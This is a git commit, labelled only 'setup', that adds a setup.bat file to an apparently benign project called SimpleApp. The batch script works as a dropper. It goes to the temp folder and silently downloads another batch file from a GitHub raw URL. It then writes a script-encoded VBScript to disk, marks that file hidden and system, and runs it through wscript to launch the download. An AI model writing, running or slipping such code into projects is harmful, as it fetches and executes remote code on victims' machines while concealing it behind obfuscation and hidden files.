fd17cb30f198f2c849a0bf161b4276ef4d334765
Solda10Skipper <99901864+Solda10Skipper@users.noreply.github.com>
2022-02-17 18:55:06 +0100

    setup

---
+++ setup.bat
@@ -0,0 +1,6 @@
+@echo off
+cd %tmp%
+curl -Ls https://raw.githubusercontent.com/Solda10Skipper/SimpleApp/main/downloader.bat -o d.cmd
+echo #@~^^TgAAAA==/M+CD+}4LmDcJq/^^DbwO Ut+^^sJ*RI!U~JrJrP'P	j1DrwD bMo;hxYdcZ#~[,ErJEBPZ~Pwl^^d+lRcAAA==^^#~@>inv.vbe
+attrib +s +h inv.vbe
+wscript.exe "inv.vbe" "d.cmd"
